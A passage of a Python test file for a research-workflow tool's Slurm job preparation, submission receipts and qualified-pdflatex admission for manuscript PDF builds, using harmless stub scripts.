    directory = al.prepare(root, [sys.executable, '-c', 'import time; time.sleep(60)'], venv=venv,
                           checkout=tmp_path, collect_to=str(tmp_path / 'collected'), **RES)
    request = json.loads((directory / 'request.json').read_text())
    key = _job(tmp_path, request['request_id'], monkeypatch=monkeypatch)
    monkeypatch.setattr(al, 'STOP_POLL_SECONDS', 0.05)
    monkeypatch.setattr(al, 'STOP_DRAIN_SECONDS', 0.3)
    monkeypatch.setattr(al, 'DEADLINE_GRACE_SECONDS', 2)
    threading.Timer(0.5, lambda: view.update(state='stop_requested')).start()
    assert al.run(directory / 'request.json') == -signal.SIGTERM
    receipt = json.loads((root / 'logs/allocations' / key / 'allocation.json').read_text())
    assert receipt['state'] == 'stopped' and receipt['controller_stop']['state'] == 'stop_requested'
    assert receipt['attempts'][-1]['state'] == 'stopped' and 'collected_to' not in receipt


# ---- the Slurm path is unchanged ---------------------------------------------------------------------

def test_the_slurm_script_and_submission_record_are_byte_identical(tmp_path, venv):
    root = _planning_run(tmp_path)
    directory = al.prepare(root, ['claude', '-p', "it's"], venv=venv, checkout=tmp_path, account='lab',
                           partition='standard', cpus=8, minutes=600, prefix='/opt/tools', modules=['gcc/12'],
                           env=['RAVEL_LEASE_WAIT_SECONDS=60'], claude_config_dir='/net/homes/u/.claude-ravel',
                           job_name='study')
    request = json.loads((directory / 'request.json').read_text())
    q = shlex.quote
    expected = '\n'.join([
        '#!/bin/bash', '#SBATCH --job-name=study', '#SBATCH --account=lab', '#SBATCH --partition=standard',
        '#SBATCH --nodes=1', '#SBATCH --ntasks=1', '#SBATCH --cpus-per-task=8', '#SBATCH --time=600',
        f'#SBATCH --output={directory}/slurm-%j.out',
        f'# RAVEL allocation study request {request["request_id"]} for run {request["run"]["run_id"]}',
        '# The request beside this script is the record; write a new request instead of editing this file.',
        '[ -f /etc/profile ] && . /etc/profile >/dev/null 2>&1', 'set -euo pipefail', 'module load gcc/12',
        'export RAVEL_NATIVE_BUILD=/opt/tools',
        f"if [ -f {q(str(tmp_path) + '/native/scripts/paths.sh')} ]; then set +u; "
        f". {q(str(tmp_path) + '/native/scripts/paths.sh')}; set -u; fi",
        'export CLAUDE_CONFIG_DIR=/net/homes/u/.claude-ravel', 'export RAVEL_LEASE_WAIT_SECONDS=60',
        f'export VIRTUAL_ENV={q(str(venv))}', f'export PATH={q(str(venv) + "/bin")}:"$PATH"',
        'export RAVEL_JOBS="${SLURM_CPUS_PER_TASK:-1}"', f'cd {q(str(root.resolve()))}',
        f'exec {q(str(venv) + "/bin/python")} -m ravel site study-job run --request '
        f'{q(str(directory / "request.json"))}']) + '\n'
    assert (directory / 'study.sbatch').read_text() == expected
    assert set(request) == {'schema_version', 'kind', 'request_id', 'created_utc', 'rundir', 'run', 'rung', 'route',
                            'binding', 'approval_files', 'agent', 'resources', 'environment', 'collect_to'}
    tool = tmp_path / 'sbatch'
    tool.write_text('#!/bin/sh\necho "$@" > "$0.args"; echo "4242;clustera"\n')
    tool.chmod(0o755)
    assert al.submit(directory, sbatch=str(tool)) == '4242'
    assert (tmp_path / 'sbatch.args').read_text().split() == ['--parsable', str(directory / 'study.sbatch')]
    record = json.loads((directory / 'submission.json').read_text())
    assert list(record) == ['request_id', 'job_id', 'submitted_utc', 'sbatch'] and record['sbatch'] == str(tool)


def test_the_slurm_receipt_keeps_its_fields(tmp_path, venv, monkeypatch):
    root = _planning_run(tmp_path)
    directory = al.prepare(root, [sys.executable, '-c', 'pass'], venv=venv, checkout=tmp_path, account='lab',
                           partition='standard', cpus=1, minutes=10)
    monkeypatch.setattr(ml, 'slurm_allocation', lambda *a, **k: {'cluster': 'clustera', 'job_id': '9100002'})
    monkeypatch.setattr(ml, 'allocation_identity', lambda: {'scope': 'slurm-clustera-9100002', 'job_id': '9100002'})
    assert al.run(directory / 'request.json') == 0
    path, = (root / 'logs/allocations').glob('*/allocation.json')
    receipt = json.loads(path.read_text())
    assert list(receipt) == ['schema_version', 'kind', 'request_id', 'request_sha256', 'run', 'rundir', 'rung',
                             'route', 'binding', 'approval_files', 'allocation', 'lease_directory', 'started_utc',
                             'agent', 'state', 'agent_exit', 'ended_utc', 'lease']
    assert receipt['state'] == 'finished'


# ---- PDF admission: a site profile without TeX never implies a PDF build ---------------------------

def _pdf_step(engine):
    from ravel.controller.routes.manuscript import note
    return {'id': 'm03-pdf', 'kind': 'operate', 'operation': note.OPERATIONS['pdf'], 'depends_on': [],
            'outputs': [{'path': note.RECEIPT, 'kind': 'document', 'required': True}],
            'parameters': {'launch': {'argv': [sys.executable, '-I', '-m', note.__name__, 'pdf', '--root', '.',
                                               '--tex', engine, '--wall-seconds', '900'], 'reads': []}}}


def _engine(path):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text('#!/bin/sh\necho "pdfTeX 3.14"\n')
    path.chmod(0o755)
    return path


def test_the_site_profile_is_ready_without_tex_and_keeps_its_ml_and_disk_gate():
    from ravel.setup import manifest as mf
    from ravel.setup.doctor import select_groups
    document, _ = mf.load(mf.repo_root())
    site = select_groups(document, profile='site')
    assert 'tex' not in site and 'ml' in site and document['profiles']['site']['disk_gb'] == 12
    assert 'tex' in select_groups(document, mode='manuscript-build')


def test_the_pdf_stage_holds_until_its_manuscript_build_qualification(tmp_path, monkeypatch):
    from ravel.controller.routes.manuscript import staged
    from ravel.setup import manifest as mf
    document, _ = mf.load(mf.repo_root())
    record = next(g for g in document['groups'] if g['id'] == 'tex')['qualification']['record']
    prefix = tmp_path / 'prefix'
    qualified = _engine(prefix / 'bin/pdflatex')
    system = _engine(tmp_path / 'usr/bin/pdflatex')
    monkeypatch.setenv('RAVEL_NATIVE_BUILD', str(prefix))
    run = tmp_path / 'run'
    (run / 'inputs').mkdir(parents=True)
    # A site host: TeX outside its profile, an ordinary pdflatex on the path, no qualification.
    monkeypatch.setattr(mf, 'detect_platform', lambda *a, **k: 'linux-x86_64' if record['platform'] != 'linux-x86_64'
                        else 'linux-aarch64')
    assert staged.qualified_engine() is None
    # The plan never takes the pdflatex on the path: without the qualification it names no engine.
    monkeypatch.setenv('PATH', f"{system.parent}{os.pathsep}{os.environ['PATH']}")
    assert staged.parameters({}, {}, {}, [])['tex'] == ''
    for engine in (system, qualified):
        basis, errors = staged.pdf_admission(_pdf_step(str(engine)), run)
        assert basis is None and [e['code'] for e in errors] == ['manuscript_pdf_unqualified']
    context = {'plan': {'steps': [_pdf_step(str(system))]}, 'run_dir': run, 'store': None}
    assert 'manuscript_pdf_unqualified' in {e.get('code') for e in staged.admit(_pdf_step(str(system)), context)}
    # Without an engine the stage runs to its typed source-only ending and claims no PDF.
    assert staged.pdf_admission(_pdf_step(''), run) == ('source-only', [])
    # The qualified host: only the qualified prefix engine is admitted.
    monkeypatch.setattr(mf, 'detect_platform', lambda *a, **k: record['platform'])
    assert staged.qualified_engine() == qualified
    assert staged.pdf_admission(_pdf_step(str(qualified)), run) == ('manuscript-build-qualification', [])
    assert staged.pdf_admission(_pdf_step(str(system)), run)[0] is None
    assert staged.parameters({}, {}, {}, [])['tex'] == str(qualified)


def test_an_explicit_reference_host_build_record_admits_only_its_exact_host_and_engine(tmp_path, monkeypatch):
    from ravel.controller.routes.manuscript import staged
    monkeypatch.setattr(staged, 'qualified_engine', lambda environ=None: None)
    engine = _engine(tmp_path / 'tex/bin/pdflatex')
    run = tmp_path / 'run'
    (run / 'inputs').mkdir(parents=True)
    u = os.uname()
    host = {'nodename': u.nodename, 'sysname': u.sysname, 'release': u.release, 'version': u.version,
            'machine': u.machine}
    record = {'schema_version': 1, 'kind': 'manuscript-reference-host-build', 'host_identity': host,
              'engine': {'path': str(engine), 'sha256': hashlib.sha256(engine.read_bytes()).hexdigest()},
              'doctor': {'mode': 'manuscript-build', 'result': 'ready', 'report_sha256': 'a' * 64}}
    path = run / staged.REFERENCE_BUILD
    path.write_text(json.dumps(record))
    assert staged.pdf_admission(_pdf_step(str(engine)), run) == ('reference-host-build', [])
    for change in ({'host_identity': host | {'nodename': host['nodename'] + '-other'}},
                   {'host_identity': host | {'release': host['release'] + '.1'}},
                   {'doctor': record['doctor'] | {'result': 'needs attention'}},
                   {'engine': record['engine'] | {'sha256': 'b' * 64}}, {'kind': 'manuscript-build'}):
        path.write_text(json.dumps(record | change))
        assert staged.pdf_admission(_pdf_step(str(engine)), run)[0] is None, change
    path.write_text(json.dumps(record))
    engine.write_text(engine.read_text() + '# changed\n')
    assert staged.pdf_admission(_pdf_step(str(engine)), run)[0] is None
    path.unlink()
    path.symlink_to(tmp_path / 'elsewhere.json')
    assert staged.pdf_admission(_pdf_step(str(engine)), run)[0] is None
